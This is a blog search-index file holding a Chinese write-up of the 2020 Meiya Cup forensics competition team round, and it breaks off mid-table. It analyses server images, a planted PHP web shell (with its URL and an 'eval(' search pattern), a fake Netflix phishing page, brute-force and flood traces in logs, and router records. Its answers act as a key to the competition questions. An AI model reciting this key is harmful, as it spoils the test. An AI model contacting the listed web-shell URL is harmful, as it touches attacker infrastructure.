<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>2020年“美亚杯”第六届中国电子数据取证大赛团队赛全解析</title>
    <url>/20meiyacupgroup.html</url>
    <content><![CDATA[<p>美亚杯2020 - 团体赛 Zello&amp;Xeno服务器部分 Write Up<a href="https://forensics.xidian.edu.cn/wiki/Zello&amp;Xeno/#2020-zelloxeno-write-up">¶</a></p>
<h1 id="Zello服务器镜像模拟¶"><a href="#Zello服务器镜像模拟¶" class="headerlink" title="Zello服务器镜像模拟¶"></a>Zello服务器镜像模拟<a href="https://forensics.xidian.edu.cn/wiki/Zello&amp;Xeno/#zello">¶</a></h1><p>Zello服务器使用了LVM2硬盘，因此导致了火眼仿真程序生成的虚拟机文件无法直接启动，需要手动在配置中将“EFI引导”更改为“BOIS（Legacy）引导”。</p>
<p>在镜像文件的GPT分区类型也指出该分区为BOIS引导分区。参见<a href="https://blog.csdn.net/humanof/article/details/88644691">GPT 分区详解</a>。</p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/202111032026240.png" alt="image-20201121201412956"></p>
<p>此外，还可以将LVM2分区直接挂载在物理机上，再用火眼对LVM2分区进行仿真操作。</p>
<p>不过我正常使用火眼仿真没有问题</p>
<hr>
<h2 id="01-Zello服务器的哈希值（SHA256）是甚么？¶"><a href="#01-Zello服务器的哈希值（SHA256）是甚么？¶" class="headerlink" title="01 Zello服务器的哈希值（SHA256）是甚么？¶"></a>01 Zello服务器的哈希值（SHA256）是甚么？<a href="https://forensics.xidian.edu.cn/wiki/Zello&amp;Xeno/#01-zellosha256">¶</a></h2><p>在取证大师中对整个镜像进行SHA256计算即可。</p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/202111021854884.png" alt="image-20211020103354697"></p>
<hr>
<h2 id="02-卷组是何时创建的？¶"><a href="#02-卷组是何时创建的？¶" class="headerlink" title="02 卷组是何时创建的？¶"></a>02 卷组是何时创建的？<a href="https://forensics.xidian.edu.cn/wiki/Zello&amp;Xeno/#02">¶</a></h2><p>LVM在每个物理卷头部都维护了一个metadata，其中包含有关于分区的基本信息。参见<a href="https://blog.csdn.net/weixin_41843699/article/details/106467864">LVM2—Logical Volume Manager</a>。</p>
<p>通过对LVM2分区进行16进制查看即可得到相关信息，其中包含有分区名称、分区创建时间、物理卷的PV UUID、物理卷的VG UUID等信息。同样的信息可以在</p>
<p><code>/etc/lvm/backup/</code></p>
<p>目录下找到，这样在Ubuntu-vg中可以看到<strong>2/3/4/5题答案</strong>。可能会用到时间戳转换</p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/202111032026241.png" alt="image-20211020104609263"></p>
<hr>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/202111032026242.png" alt="image-20211020104931674"></p>
<p>或，取证大师自动识别到卷组</p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/202111032026243.png" alt="image-20211020103456658"></p>
<h2 id="03-卷组的名称是甚么？¶"><a href="#03-卷组的名称是甚么？¶" class="headerlink" title="03 卷组的名称是甚么？¶"></a>03 卷组的名称是甚么？<a href="https://forensics.xidian.edu.cn/wiki/Zello&amp;Xeno/#03">¶</a></h2><p>除了在02题中所述的metadata中以外，还可以通过使用火眼证据分析软件自动识别出LVM2分区的名称（该软件也可以直接读取LVM2分区中的文件）。</p>
<p><img src="https://forensics.xidian.edu.cn/wiki/img/03-hlyyds.png" alt="image-20201121203321975"></p>
<hr>
<h2 id="04-物理卷的PV-UUID是多少？¶"><a href="#04-物理卷的PV-UUID是多少？¶" class="headerlink" title="04 物理卷的PV UUID是多少？¶"></a>04 物理卷的PV UUID是多少？<a href="https://forensics.xidian.edu.cn/wiki/Zello&amp;Xeno/#04-pv-uuid">¶</a></h2><p>仿真后使用命令：</p>
<pre><code>sudo pvdisplay</code></pre><p><img src="https://gitee.com/marmalade0/images/raw/master/img/202111032026244.png" alt="image-20211020104241631"></p>
<h2 id="05-卷组的VG-UUID是甚么？¶"><a href="#05-卷组的VG-UUID是甚么？¶" class="headerlink" title="05 卷组的VG UUID是甚么？¶"></a>05 卷组的VG UUID是甚么？<a href="https://forensics.xidian.edu.cn/wiki/Zello&amp;Xeno/#05-vg-uuid">¶</a></h2><p>除了在02题中所述的metadata中以外，通过火眼仿真后还可以使用lvm命令进行查看：</p>
<pre><code>sudo lvdisplay -a
sudo pvdisplay
sudo vgdisplay</code></pre><p><img src="https://forensics.xidian.edu.cn/wiki/img/04-lvm.png" alt="image-20201121204553414"></p>
<p>取证大师查看也可</p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/202111032026245.png" alt="image-20211020103904116"></p>
<h2 id="06-Zello服务器的Linux内核版本是甚么？¶"><a href="#06-Zello服务器的Linux内核版本是甚么？¶" class="headerlink" title="06 Zello服务器的Linux内核版本是甚么？¶"></a>06 Zello服务器的Linux内核版本是甚么？<a href="https://forensics.xidian.edu.cn/wiki/Zello&amp;Xeno/#06-zellolinux">¶</a></h2><h2 id="07-Zello服务器的操作系统版本是甚么？¶"><a href="#07-Zello服务器的操作系统版本是甚么？¶" class="headerlink" title="07 Zello服务器的操作系统版本是甚么？¶"></a>07 Zello服务器的操作系统版本是甚么？<a href="https://forensics.xidian.edu.cn/wiki/Zello&amp;Xeno/#07-zello">¶</a></h2><p>06通过<code>uname -a</code>显示全部信息或<code>uname -r</code>查看内核版本； 查看<code>/proc/version</code>文件；</p>
<p>07 查看<code>/etc/lsb-release</code>文件；或者使用命令</p>
<pre><code>lsb-release -a</code></pre><p><img src="https://forensics.xidian.edu.cn/wiki/img/06-LinuxCore.png" alt="image-20201121205654186"></p>
<hr>
<h2 id="08-Zello服务器的主机名是甚么？¶"><a href="#08-Zello服务器的主机名是甚么？¶" class="headerlink" title="08 Zello服务器的主机名是甚么？¶"></a>08 Zello服务器的主机名是甚么？<a href="https://forensics.xidian.edu.cn/wiki/Zello&amp;Xeno/#08-zello">¶</a></h2><p>通过<code>uname -a</code>或<code>uname -n</code>查看主机名； 查看<code>/etc/hostname</code>文件。</p>
<p><img src="https://forensics.xidian.edu.cn/wiki/img/08-ZelloCore.png" alt="image-20201121210208273"></p>
<hr>
<h2 id="09-Zello服务器的机器ID是甚么？¶"><a href="#09-Zello服务器的机器ID是甚么？¶" class="headerlink" title="09 Zello服务器的机器ID是甚么？¶"></a>09 Zello服务器的机器ID是甚么？<a href="https://forensics.xidian.edu.cn/wiki/Zello&amp;Xeno/#09-zelloid">¶</a></h2><blockquote>
<p>“计算器ID”其实就是“计算机ID”，大概是香港那边独特的表达方式吧。</p>
</blockquote>
<p>查看<code>/etc/machine-id</code>文件。</p>
<p> <img src="https://gitee.com/marmalade0/images/raw/master/img/202111032026246.png" alt="image-20211020105423650"></p>
<hr>
<h2 id="10-Zello服务器中使用的wordpress版本是甚么？¶"><a href="#10-Zello服务器中使用的wordpress版本是甚么？¶" class="headerlink" title="10 Zello服务器中使用的wordpress版本是甚么？¶"></a>10 Zello服务器中使用的wordpress版本是甚么？<a href="https://forensics.xidian.edu.cn/wiki/Zello&amp;Xeno/#10-zellowordpress">¶</a></h2><p>仿真之后访问网站后台即可在右下角看到版本号。而火狐浏览器的历史记录中就包含了网站的后台地址，甚至打开浏览器之后恢复的上一次异常关闭页面中就有后台页面。</p>
<p><img src="https://forensics.xidian.edu.cn/wiki/img/10-Lwordpressversion.png" alt="image-20201121211444808"></p>
<p>或者在/etc/apache2/apache2.conf中查看源码存放路径</p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/202111032026247.png" alt="image-20211030142954066"></p>
<p>在<code>/var/www/html/wordpress/wp-include/version.php</code>中查看。</p>
<p><img src="https://forensics.xidian.edu.cn/wiki/img/10-wordpressversion.png" alt="image-20201121211745288"></p>
<hr>
<h2 id="11-Zello服务器与之同步的主机名是甚么？¶"><a href="#11-Zello服务器与之同步的主机名是甚么？¶" class="headerlink" title="11 Zello服务器与之同步的主机名是甚么？¶"></a>11 Zello服务器与之同步的主机名是甚么？<a href="https://forensics.xidian.edu.cn/wiki/Zello&amp;Xeno/#11-zello">¶</a></h2><p>查看hosts <code>cat /etc/hosts</code> 或<code>/etc/ntp.conf</code>文件,或者找root文件夹下的.bash_history中的历史命令</p>
<p>关于<code>ntp.conf</code>文件的作用，详见<a href="https://blog.csdn.net/qq_35663625/article/details/103064495">ntp.conf配置文件详解</a>。</p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/202111032026248.png" alt="image-20211020105908561"></p>
<hr>
<h2 id="12-Zello服务器的时区是甚么？¶"><a href="#12-Zello服务器的时区是甚么？¶" class="headerlink" title="12 Zello服务器的时区是甚么？¶"></a>12 Zello服务器的时区是甚么？<a href="https://forensics.xidian.edu.cn/wiki/Zello&amp;Xeno/#12-zello">¶</a></h2><p>方法一：通过<code>date</code>命令</p>
<p><img src="https://forensics.xidian.edu.cn/wiki/img/12-timezone.png" alt="image-20201121212853024"></p>
<p>方法二：使用 timedatectl 命令查看</p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/202111032026249.png" alt="image-20211021094712236"></p>
<p>方法三：去/etc 下查看 timezone</p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/202111032026250.png" alt="image-20211021094732384"></p>
<p>方法四： 没仿真起来可以查看/etc/localtime link 到哪个文件</p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/202111032026251.png" alt="image-20211021094752948"></p>
<p>方法五： 导出或者查看 localtime 文件最后一行</p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/202111032026252.png" alt="image-20211021094820401"></p>
<hr>
<p>小tips：用户痕迹能查看终端的可以看看终端配置命令</p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/202111032026253.png" alt="image-20211020110225906"></p>
<h2 id="13-有多少个本地用户已登录到Zello服务器？¶"><a href="#13-有多少个本地用户已登录到Zello服务器？¶" class="headerlink" title="13 有多少个本地用户已登录到Zello服务器？¶"></a>13 有多少个本地用户已登录到Zello服务器？<a href="https://forensics.xidian.edu.cn/wiki/Zello&amp;Xeno/#13-zello">¶</a></h2><p>查看<code>/etc/passwd</code>文件。</p>
<p>查看用户命令</p>
<pre><code>cat /etc/passwd | grep /bin/bash</code></pre><p>其中每行各个字段含义如下：</p>
<p><img src="https://forensics.xidian.edu.cn/wiki/img/13-section.jpeg" alt="image"></p>
<p>普通用户有两个特征：一是UID介于500~65535之间；二是shell的起始位置为<code>/bin/bash</code>。</p>
<p><img src="https://forensics.xidian.edu.cn/wiki/img/13-users.png" alt="image-20201121214137347"></p>
<p>方法二：、</p>
<p>使用 last 命令可以查看， 只用 zadmin 登录</p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/202111032026255.png" alt="image-20211021094921237"></p>
<p>lastb查看登录失败用户，也是zadmin</p>
<p>没仿真起来后可以导出/var/log/wtmp 文件，放到自己的 linux 环境中使用命令</p>
<p>last –f 文件 查看</p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/202111032026256.png" alt="image-20211021094959357"></p>
<hr>
<h2 id="14-植入网络目录（Webdirectory）的网页壳层（Web-Shell）的哈希值（MD5）是甚么？¶"><a href="#14-植入网络目录（Webdirectory）的网页壳层（Web-Shell）的哈希值（MD5）是甚么？¶" class="headerlink" title="14 植入网络目录（Webdirectory）的网页壳层（Web Shell）的哈希值（MD5）是甚么？¶"></a>14 植入网络目录（Webdirectory）的网页壳层（Web Shell）的哈希值（MD5）是甚么？<a href="https://forensics.xidian.edu.cn/wiki/Zello&amp;Xeno/#14-webdirectoryweb-shellmd5">¶</a></h2><p>将<code>/var/www/html/wordpress/</code>目录下的全部文件，导出，使用杀毒软件查杀（windows defender在导出时就会报毒）。</p>
<p><img src="https://forensics.xidian.edu.cn/wiki/img/14-hryyds.png" alt="image-20201121214538928"></p>
<p>或者以<code>eval(</code>为关键词检索导出文件中的php文件。（使用的搜索工具为FileLocatorPro）</p>
<p><img src="https://forensics.xidian.edu.cn/wiki/img/14-searcheval.png" alt="image-20201121214932752"></p>
<p>使用命令certutil -hashfile 123.php md5<img src="https://gitee.com/marmalade0/images/raw/master/img/202111032026257.png" alt="image-20211020134717941"></p>
<p>方法二：查看 web 日志 </p>
<p>cd /var/log/apache2 </p>
<p>gunzip –d access.log.2.gz </p>
<p>vi access.log.2.gz</p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/202111032026258.png" alt="image-20211021095133425"></p>
<p>发现可疑文件 123.php </p>
<p>路径 /var/www/html/wordpress/wp-includes/sales/info/123.php 查看内容</p>
<p>或者访问 <a href="http://zello-onlineshop.sytes.net/wp-includes/sales/info/123.php">http://zello-onlineshop.sytes.net/wp-includes/sales/info/123.php</a></p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/202111032026259.png" alt="image-20211021095227142"></p>
<hr>
<h2 id="15-var-www-html-wordpress-net-2020-Login-index-php有甚么作用？¶"><a href="#15-var-www-html-wordpress-net-2020-Login-index-php有甚么作用？¶" class="headerlink" title="15 \var\www\html\wordpress\net\2020\Login index.php有甚么作用？¶"></a>15 \var\www\html\wordpress\net\2020\Login index.php有甚么作用？<a href="https://forensics.xidian.edu.cn/wiki/Zello&amp;Xeno/#15-varwwwhtmlwordpressnet2020login32indexphp">¶</a></h2><p>盗取资料</p>
<h2 id="16-钓鱼网站伪装成甚么网站？¶"><a href="#16-钓鱼网站伪装成甚么网站？¶" class="headerlink" title="16 钓鱼网站伪装成甚么网站？¶"></a>16 钓鱼网站伪装成甚么网站？<a href="https://forensics.xidian.edu.cn/wiki/Zello&amp;Xeno/#16">¶</a></h2><p>查看<code>index.php</code>可以发现这个页面是<strong>伪造的Netflix的登录页面</strong>，其中第一行包含了<code>crypt.php</code>，结合上一题杀毒软件对<code>crypt.php</code>的报毒，应该是钓鱼网页，网站长这样。</p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/202111032026260.png" alt="image-20211021095258914"></p>
<hr>
<h2 id="17-下列哪个IP对Zello服务器进行了蛮力攻击？¶"><a href="#17-下列哪个IP对Zello服务器进行了蛮力攻击？¶" class="headerlink" title="17 下列哪个IP对Zello服务器进行了蛮力攻击？¶"></a>17 下列哪个IP对Zello服务器进行了蛮力攻击？<a href="https://forensics.xidian.edu.cn/wiki/Zello&amp;Xeno/#17-ipzello">¶</a></h2><p>查看<code>/var/log/apache2/</code>目录下的<code>access.log.x</code>文件，全部导出来。其中有几个被压缩，需要解包。</p>
<p>可用notepad++的文件夹搜索功能</p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/202111032026261.png" alt="image-20211030144109741">可以在<code>access.log.3</code>文件中发现</p>
<p>能看到出现次数</p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/202111032026262.png" alt="image-20211030144219144"></p>
<p><code>203.186.94.68</code>对服务器进行了1432次请求。  </p>
<p><img src="https://forensics.xidian.edu.cn/wiki/img/17-searchip.png" alt="image-20201121221501272"></p>
<hr>
<p>蛮力攻击应该指的是爆破，对日志进行审计，搜索爆破工具关键字 Hydra 得到。</p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/202111032026263.png" alt="image-20211021095355276"></p>
<p>或者在 linux 下使用命令行查看</p>
<p> cd /var/log/apache2 </p>
<p>gunzip –d access.log.4.gz</p>
<p> vi access.log.4</p>
<h2 id="18-Zello-Web服务器的URL是甚么？¶"><a href="#18-Zello-Web服务器的URL是甚么？¶" class="headerlink" title="18 Zello Web服务器的URL是甚么？¶"></a>18 Zello Web服务器的URL是甚么？<a href="https://forensics.xidian.edu.cn/wiki/Zello&amp;Xeno/#18-zello-weburl">¶</a></h2><p>参见第10、11题。</p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/202111032026264.png" alt="image-20211020143050865"></p>
<p>导出来用 notepad++查看</p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/202111032026265.png" alt="image-20211021095508043"></p>
<p>或者使用 Linux 命令行查看 </p>
<p>查看 web 日志 </p>
<p>vi /var/log/apache2/access.log.2</p>
<hr>
<h2 id="19-LVM2容器的第一个扇区是什么？¶"><a href="#19-LVM2容器的第一个扇区是什么？¶" class="headerlink" title="19 LVM2容器的第一个扇区是什么？¶"></a>19 LVM2容器的第一个扇区是什么？<a href="https://forensics.xidian.edu.cn/wiki/Zello&amp;Xeno/#19-lvm2">¶</a></h2><h2 id="20-Zello服务器中LVM2容器的大小（以字节为单位）是甚么？¶"><a href="#20-Zello服务器中LVM2容器的大小（以字节为单位）是甚么？¶" class="headerlink" title="20 Zello服务器中LVM2容器的大小（以字节为单位）是甚么？¶"></a>20 Zello服务器中LVM2容器的大小（以字节为单位）是甚么？<a href="https://forensics.xidian.edu.cn/wiki/Zello&amp;Xeno/#20-zellolvm2">¶</a></h2><p>在取证大师中查看没有识别出来的LVM2分区（显示为“未分配簇”）的相关信息。<del>辣鸡取证大师终于派上用场了</del></p>
<p><img src="https://forensics.xidian.edu.cn/wiki/img/19-LVM2.png" alt="image-20201121221958633"></p>
<p>用 xways 直接看到</p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/202111032026266.png" alt="image-20211021095612707"></p>
<p>或者使用取证大师小程序</p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/202111032026267.png" alt="image-20211021095700985"></p>
<hr>
<h2 id="21-在Zello服务器以及Alice的装置中可以找到甚么共同文件？¶"><a href="#21-在Zello服务器以及Alice的装置中可以找到甚么共同文件？¶" class="headerlink" title="21 在Zello服务器以及Alice的装置中可以找到甚么共同文件？¶"></a>21 在Zello服务器以及Alice的装置中可以找到甚么共同文件？<a href="https://forensics.xidian.edu.cn/wiki/Zello&amp;Xeno/#21-zelloalice">¶</a></h2><p>可以在Zello镜像的<code>/var/www/html/wordpress/net/2020/login/</code>目录下找到<code>R3ZZ.txt</code>。</p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/202111032026268.png" alt="image-20211020143729796"></p>
<p>或者查看 History</p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/202111032026269.png" alt="image-20211021095742728"></p>
<hr>
<h2 id="22-2020年8月29日在Xeno服务器中发现的攻击类型是甚么？¶"><a href="#22-2020年8月29日在Xeno服务器中发现的攻击类型是甚么？¶" class="headerlink" title="22 2020年8月29日在Xeno服务器中发现的攻击类型是甚么？¶"></a>22 2020年8月29日在Xeno服务器中发现的攻击类型是甚么？<a href="https://forensics.xidian.edu.cn/wiki/Zello&amp;Xeno/#22-2020829xeno">¶</a></h2><table>
<thead>
<tr>
<th>2020年8月29日在Xeno服务器中发现的攻击类型是甚么？</th>
<th></th>
<th>1</th>
<th>第六届美亚杯</th>
<th>电子数据取证</th>
<th>单选</th>
<th>初级</th>
<th>A:HTTP GET/POST Flood;B:NTP  Amplification;C:Ping of Death;D:SYN Flood;E:SNMP Flood</th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p>实际上应该是9月29日</p>
<p>查看日志可以发现当天服务器收到了大量的GET/POST请求，并且请求的为某几个特定页面，攻击方式应为HTTP GET/POST Flood。</p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/202111032026270.png" alt="image-20211021095828478"></p>
<hr>
<h2 id="23-哪个IP地址在日志中条目数量最多？¶"><a href="#23-哪个IP地址在日志中条目数量最多？¶" class="headerlink" title="23 哪个IP地址在日志中条目数量最多？¶"></a>23 哪个IP地址在日志中条目数量最多？<a href="https://forensics.xidian.edu.cn/wiki/Zello&amp;Xeno/#23-ip">¶</a></h2><p>方法一：挨个用 notepad++搜索计数</p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/202111032026271.png" alt="image-20211021095858458"></p>
<p>方法二： 使用 Log Parser </p>
<p>选择 NCSA Log 格式 </p>
<p>SELECT remotehostname,count(1) FROM ‘Z:\Meiya Cup 2020\Image\xeno access.log_20200929-20201006\access.log’ group by remotehostname order by count(1) desc</p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/202111032026272.png" alt="image-20211021095937371"></p>
<p>方法三：</p>
<p> linux 使用命令 </p>
<p>awk ‘{print $1}’ access.log | sort | uniq -c | sort -nr -k1 | head -n 20</p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/202111032026273.png" alt="image-20211021100014912"></p>
<p>方法四：</p>
<p>先去除日志中所有损坏的行，然后写一个简单的python脚本对出现的IP的次数进行统计即可。 也可以使用搜索工具对每个选项中的IP进行搜索。<del>不懂取证警告</del></p>
<pre><code>dic = {}
with open("1.txt", "r", encoding='utf-8') as f:
    for i in f:
        ip = i.split(' ')[0]
        if ip in dic:
            dic[ip] += 1
        else:
            dic[ip] = 1
print(dic)</code></pre><hr>
<h2 id="24-这个登录次数最多的IP地址，它访问最多的是哪个页面？¶"><a href="#24-这个登录次数最多的IP地址，它访问最多的是哪个页面？¶" class="headerlink" title="24 这个登录次数最多的IP地址，它访问最多的是哪个页面？¶"></a>24 这个登录次数最多的IP地址，它访问最多的是哪个页面？<a href="https://forensics.xidian.edu.cn/wiki/Zello&amp;Xeno/#24-ip">¶</a></h2><p>notepad方便一些，就是可能会比较卡。或者logparser</p>
<p>SELECT request,count(1) FROM ‘Z:\Meiya Cup 2020\Image\xeno access.log_20200929- 20201006\access.log’ where remotehostname=’14.102.184.0’ group by request order by count(1) desc</p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/202111032026274.png" alt="image-20211021100133777"></p>
<p>方法二：继续写python脚本。 也可以使用搜索工具进行正则匹配，对每个选项中的页面进行搜索。<del>不懂取证警告+1</del></p>
<pre><code>times = {
    'A': 0,
    'B': 0,
    'C': 0,
    'D': 0,
    'E': 0,
}
with open("1.txt", "r", encoding='utf-8') as f:
    for i in f:
        if "14.102.184.0" in i:
            if "/listen.icepush.xml HTTP/1.1\" 200" in i:
                times['A'] += 1
            elif "/risk.xhtml HTTP/1.1\" 200" in i:
                times['B'] += 1
            elif "/explorer.xhtml HTTP/1.1\" 200" in i:
                times['C'] += 1
            elif "/login.jsp HTTP/1.1\" 200" in i:
                times['D'] += 1
            elif "/listViewRisjs.xhtml HTTP/1.1\" 200 " in i:
                times['E'] += 1
print(times)</code></pre><hr>
<h2 id="25-这个登录次数最多的IP地址来自哪个国家或地区？¶"><a href="#25-这个登录次数最多的IP地址来自哪个国家或地区？¶" class="headerlink" title="25 这个登录次数最多的IP地址来自哪个国家或地区？¶"></a>25 这个登录次数最多的IP地址来自哪个国家或地区？<a href="https://forensics.xidian.edu.cn/wiki/Zello&amp;Xeno/#25-ip">¶</a></h2><p>使用离线IP查询工具进行查询，得知是香港的IP。</p>
<p>实际上，这个IP地址就是Daniel的家庭IP地址……</p>
<p><img src="https://forensics.xidian.edu.cn/wiki/img/26-danielyyds.png" alt="image-20201121230407289"></p>
<hr>
<h2 id="26-这个登录次数最多的IP地址，合共有多少次成功登录-¶"><a href="#26-这个登录次数最多的IP地址，合共有多少次成功登录-¶" class="headerlink" title="26 这个登录次数最多的IP地址，合共有多少次成功登录?¶"></a>26 这个登录次数最多的IP地址，合共有多少次成功登录?<a href="https://forensics.xidian.edu.cn/wiki/Zello&amp;Xeno/#26-ip">¶</a></h2><p>18次</p>
<p>python脚本：</p>
<pre><code>time = 0
with open("1.txt", "r", encoding='utf-8') as f:
    for i in f:
        if "14.102.184.0" in i and "login" in i:
            dd = i.split(' ')
            if '200' in dd:
                time += 1
print(time)</code></pre><p>但因为损坏部分中也可能存在登陆成功的日志，所以实际登录成功次数会略高一些。</p>
<p>过滤出现200的条数</p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/202111032026275.png" alt="image-20211030145648050"></p>
<p>有以下信息可看做成功登陆</p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/202111032026277.png" alt="image-20211021100240866"></p>
<hr>
<h2 id="27-除DDoS之外，还可能涉及其他攻击吗？¶"><a href="#27-除DDoS之外，还可能涉及其他攻击吗？¶" class="headerlink" title="27 除DDoS之外，还可能涉及其他攻击吗？¶"></a>27 除DDoS之外，还可能涉及其他攻击吗？<a href="https://forensics.xidian.edu.cn/wiki/Zello&amp;Xeno/#27-ddos">¶</a></h2><hr>
<h2 id="28-从该网站下载了多少数据？¶"><a href="#28-从该网站下载了多少数据？¶" class="headerlink" title="28 从该网站下载了多少数据？¶"></a>28 从该网站下载了多少数据？<a href="https://forensics.xidian.edu.cn/wiki/Zello&amp;Xeno/#28">¶</a></h2><table>
<thead>
<tr>
<th>除DDoS之外，还可能涉及其他攻击吗？</th>
<th>E</th>
<th>2</th>
<th>第六届美亚杯</th>
<th align="left">电子数据取证</th>
<th>单选</th>
<th>中级</th>
<th>A:SQL注入;B:命令注入;C:系统漏洞攻击;D:跨站脚本攻击;E:暴力破解攻击</th>
</tr>
</thead>
<tbody><tr>
<td>从该网站下载了多少数据？</td>
<td>E</td>
<td>2</td>
<td>第六届美亚杯</td>
<td align="left">电子数据取证</td>
<td>单选</td>
<td>中级</td>
<td>A:大概 20 MB;B:大概 200 MB;C:大概 1  GB;D:大概 5 GB;E:现有资料不足以作推断</td>
</tr>
</tbody></table>
<p>python脚本：</p>
<pre><code>data = 0
with open("1.txt", "r", encoding='utf-8') as f:
    for i in f:
        if "14.102.184.0" in i:
            dd = i.split(' ')[-2]
            if dd.isdigit():
                data += int(dd)    
print(data)</code></pre><h1 id="团体赛-Bob部分"><a href="#团体赛-Bob部分" class="headerlink" title="团体赛 Bob部分"></a>团体赛 Bob部分</h1><h2 id="29-Bob路由器的型号是甚么？"><a href="#29-Bob路由器的型号是甚么？" class="headerlink" title="29 Bob路由器的型号是甚么？"></a>29 Bob路由器的型号是甚么？</h2><table>
<thead>
<tr>
<th>Bob路由器的型号是甚么？</th>
<th>B</th>
<th>1</th>
<th>第六届美亚杯</th>
<th>电子数据取证</th>
<th>单选</th>
<th>初级</th>
<th>A:BL - WR740N;B:TL -  WR740N;C:Archer c 1200;D:archer c7;E:TP - WRB41N</th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p>可以考虑调查报告和图片中可能有线索</p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/202111032026278.png" alt="image-20211030150741484"></p>
<p>路由器日志也可以看到</p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/202111032026279.png" alt="image-20211020155529865"></p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/202111032026280.png" alt="image-20211020170408777"></p>
<h2 id="30-Bob-家的-IP-地址是甚么？-1-分"><a href="#30-Bob-家的-IP-地址是甚么？-1-分" class="headerlink" title="30 Bob 家的 IP 地址是甚么？ (1 分)"></a>30 Bob 家的 IP 地址是甚么？ (1 分)</h2><p><img src="https://gitee.com/marmalade0/images/raw/master/img/202111032026281.png" alt="image-20211020170714534"></p>
<h2 id="31-使用路由器的装置的Mac地址是甚么-Alice？"><a href="#31-使用路由器的装置的Mac地址是甚么-Alice？" class="headerlink" title="31 使用路由器的装置的Mac地址是甚么-  Alice？"></a>31 使用路由器的装置的Mac地址是甚么-  Alice？</h2><table>
<thead>
<tr>
<th>使用路由器的装置的Mac地址是甚么-  Alice？</th>
<th>D</th>
<th>1</th>
<th>第六届美亚杯</th>
<th>电子数据取证</th>
<th>单选</th>
<th>初级</th>
<th>A:00:BA:F5:89:89:FE;B:A4:4E:31:EC:24:00;C:60:67:20:3D:3B:OC;D:00:0A:F5:89:89:FF;E:00AA:F5:82:89:FD</th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p>之前Alice的手机中考题涉及到，对Alice手机镜像进行取证，根据选项和34题推断可以推出</p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/202111032026282.png" alt="image-20211020171229625"></p>
<h2 id="32-使用路由器的装置的Mac地址是甚么-Cole？"><a href="#32-使用路由器的装置的Mac地址是甚么-Cole？" class="headerlink" title="32 使用路由器的装置的Mac地址是甚么-  Cole？"></a>32 使用路由器的装置的Mac地址是甚么-  Cole？</h2><table>
<thead>
<tr>
<th>使用路由器的装置的Mac地址是甚么-  Cole？</th>
<th>*</th>
<th>1</th>
<th>第六届美亚杯</th>
<th>电子数据取证</th>
<th>单选</th>
<th>初级</th>
<th>A:8C:3A:E3:93:80:09;B:00:0A:F5:89:89:FF;C:3C:BA:E3:93:80:09;D:00:0A:F5:89:89:FC;E:38:48:4C:17:9A:OC</th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p> 在 bob iphone 上出现和 cole 的桌面计算机 都出现 bigboss 地址 legman 和 technical guy 没找到 同上题图</p>
<h2 id="33-谁到访过Bob的家？"><a href="#33-谁到访过Bob的家？" class="headerlink" title="33* 谁到访过Bob的家？"></a>33* 谁到访过Bob的家？</h2><table>
<thead>
<tr>
<th>谁到访过Bob的家？</th>
<th>A</th>
<th>2</th>
<th>第六届美亚杯</th>
<th>电子数据取证</th>
<th>单选</th>
<th>中级</th>
<th>A:Alice 及  Cole;B:只有Alice;C:只有Cole;D:只有David;E:Alice, Cole 及David</th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p> 看路由器日志 Bob 家的路由器日志中出现 Cole 的台式机 Mac 地址，证明 Cole 曾经拜访过 Bob</p>
<h2 id="34-他们甚么时候去过Bob的家？"><a href="#34-他们甚么时候去过Bob的家？" class="headerlink" title="34* 他们甚么时候去过Bob的家？"></a>34* 他们甚么时候去过Bob的家？</h2><table>
<thead>
<tr>
